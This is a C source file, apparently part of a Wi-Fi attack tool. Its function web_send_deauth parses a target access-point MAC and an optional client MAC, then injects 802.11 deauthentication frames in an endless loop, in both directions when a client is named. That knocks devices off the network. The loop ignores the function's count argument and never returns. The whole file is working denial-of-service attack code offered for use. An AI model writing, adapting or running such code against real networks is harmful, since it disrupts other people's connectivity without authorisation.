#include "web_bridge.h"
#include "packet_injector.h"
#include "deauth_engine.h"
#include "oui_lookup.h"
#include <stdio.h>
#include <string.h>

int web_send_deauth(const char* iface, const char* bssid, const char* station, int count, int reason) {
    if (!iface || !bssid) return 0;
    uint8_t b[6], s[6];
    int bn = 0, sn = 0;
    const char* p = bssid;
    while (*p && bn < 6) {
        unsigned int v;
        if (sscanf(p, "%2x", &v) == 1) b[bn++] = (uint8_t)v;
        while (*p && *p != ':') p++;
        if (*p == ':') p++;
    }
    p = station ? station : "FF:FF:FF:FF:FF:FF";
    while (*p && sn < 6) {
        unsigned int v;
        if (sscanf(p, "%2x", &v) == 1) s[sn++] = (uint8_t)v;
        while (*p && *p != ':') p++;
        if (*p == ':') p++;
    }
    if (bn < 6 || sn < 6) return 0;

    bool targeted = memcmp(s, "\xff\xff\xff\xff\xff\xff", 6) != 0;
    int seq = 0;
    int sent = 0;
    for (;;) {
        for (int i = 0; i < 50; i++) {
            hackit_inject_deauth(iface, b, s, reason);
            sent++;
            if (targeted) {
                hackit_inject_deauth(iface, s, b, reason);
                sent++;
            }
        }
        fprintf(stderr, "\r[C] Deauth %s: %d sent", bssid, sent);
    }
    return 1;
}
